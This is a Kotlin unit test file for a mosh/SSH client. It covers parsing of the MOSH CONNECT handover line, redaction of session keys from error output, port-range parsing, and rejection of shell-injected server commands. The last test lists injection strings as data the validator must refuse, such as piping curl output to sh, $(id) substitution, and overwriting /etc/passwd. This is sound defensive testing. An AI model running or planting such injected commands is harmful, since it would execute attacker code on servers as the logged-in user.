package com.sshborg.data.ssh

import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * The handover line, read and redacted. No server needed: this is a format and a pure function.
 *
 * The redaction is not decoration. `MOSH CONNECT <port> <key>` carries the session key, and the
 * case that matters is a server which printed one and then failed anyway — the detail of that
 * failure is what the error dialog offers to copy, and what somebody would paste into an issue.
 */
class MoshBootstrapTest {

    @Test fun `the handover line yields the port and the key`() {
        val match = MoshBootstrap.CONNECT_LINE.find("\nMOSH CONNECT 60003 h7Lp0qRsTuVwXyZaBcDeFg==\r\n")
        assertEquals("60003", match?.groupValues?.get(1))
        assertEquals("h7Lp0qRsTuVwXyZaBcDeFg==", match?.groupValues?.get(2))
    }

    @Test fun `a line that is not the handover is not read as one`() {
        for (notIt in listOf(
            "mosh-server: Could not bind any port",
            "MOSH CONNECT",
            "MOSH CONNECT 60001",
            "bash: mosh-server: command not found",
        )) {
            assertFalse(notIt, MoshBootstrap.CONNECT_LINE.containsMatchIn(notIt))
        }
    }

    @Test fun `redaction takes the key out and leaves the diagnosis in`() {
        val said = """
            mosh-server (mosh 1.4.0)
            MOSH CONNECT 60999 SeCrEtKeYSeCrEtKeY1234==
            mosh-server: something went wrong afterwards
        """.trimIndent()
        val safe = MoshBootstrap.redact(said)
        assertFalse("the key survived: $safe", safe.contains("SeCrEtKeY"))
        assertFalse("the port survived next to the key", safe.contains("60999"))
        assertTrue("the diagnosis was thrown away too", safe.contains("something went wrong afterwards"))
        assertTrue("the version line was thrown away too", safe.contains("mosh 1.4.0"))
    }

    @Test fun `redaction removes every handover line, not just the first`() {
        val safe = MoshBootstrap.redact(
            "MOSH CONNECT 60001 AaAaAaAaAaAaAaAaAaAa==\nnoise\nMOSH CONNECT 60002 BbBbBbBbBbBbBbBbBbBb=="
        )
        assertFalse(safe, safe.contains("AaAa"))
        assertFalse(safe, safe.contains("BbBb"))
    }

    @Test fun `redaction caps what a dialog is asked to show`() {
        val safe = MoshBootstrap.redact("x".repeat(MoshBootstrap.DETAIL_LIMIT * 2))
        assertEquals(MoshBootstrap.DETAIL_LIMIT, safe.length)
    }

    @Test fun `the bootstrap never prints its own key`() {
        val shown = MoshBootstrap("example.test", 60001, "SeCrEtKeYSeCrEtKeY1234==").toString()
        assertFalse(shown, shown.contains("SeCrEtKeY"))
    }

    @Test fun `a port range is read the way somebody would write it down`() {
        // The shapes a person copies out of a firewall rule, including mosh's own colon.
        assertEquals("60001:60010", MoshBootstrap.portRange("60001-60010"))
        assertEquals("60001:60010", MoshBootstrap.portRange("60001:60010"))
        assertEquals("60001:60010", MoshBootstrap.portRange("  60001 - 60010 "))
        assertEquals("a single port is a range of one", "60001", MoshBootstrap.portRange("60001"))
    }

    @Test fun `nonsense asks for nothing rather than handing the server rubbish`() {
        // Null everywhere means "no -p", which leaves mosh its own range of a thousand ports —
        // the right answer for an empty field and the only safe one for a typo.
        for (asked in listOf(null, "", "   ", "abc", "60001-", "-60010", "0-10", "1-70000",
                             "60010-60001", "1-2-3")) {
            assertNull("this should not have become a -p argument: $asked", MoshBootstrap.portRange(asked))
        }
    }

    @Test fun `the server command is a command, not a line of shell`() {
        for (asked in listOf("mosh-server", "/usr/local/bin/mosh-server", "~/bin/mosh-server", "ms+1.4")) {
            assertEquals(asked, MoshBootstrap.serverCommand(asked))
        }
        assertEquals("surrounding space is not part of it", "mosh-server", MoshBootstrap.serverCommand("  mosh-server  "))
    }

    @Test fun `a command that is really a shell asks for nothing`() {
        // It is interpolated into what a remote shell reads, so these would run as what they say
        // — on the server, as the account that just logged in. A host row carrying one does not
        // have to have been typed by its owner: it can have arrived in an imported backup.
        for (asked in listOf(
            "mosh-server; curl http://example.com/x | sh",
            "mosh-server \$(id)",
            "mosh-server `id`",
            "mosh-server > /etc/passwd",
            "mosh-server --with-an-argument",
            "mosh-server&",
            "a b",
            "",
            "   ",
        )) {
            assertNull("accepted <$asked>", MoshBootstrap.serverCommand(asked))
        }
        assertNull(MoshBootstrap.serverCommand(null))
    }
}
